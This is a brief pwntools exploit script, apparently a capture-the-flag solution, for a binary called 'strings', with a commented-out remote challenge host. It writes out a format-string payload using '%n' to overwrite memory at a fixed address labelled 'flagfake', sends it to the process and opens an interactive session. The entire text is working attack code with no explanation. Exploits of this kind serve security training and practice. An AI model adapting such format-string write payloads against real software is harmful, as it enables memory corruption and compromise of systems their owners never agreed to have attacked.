
from pwn import *
context.log_level = 'debug'

e = context.binary = ELF('./strings')
r= e.process()

# r = remote('challs.n00bzunit3d.xyz', 42450)

lib = e.libc
# lib= ELF('libc6_2.36-0ubuntu4_amd64.so')
flagfake=0x404060
payload = b"%100c%14$n".ljust(64, b"\x00") + p64(flagfake)
pause()
r.sendline(payload)
r.interactive()
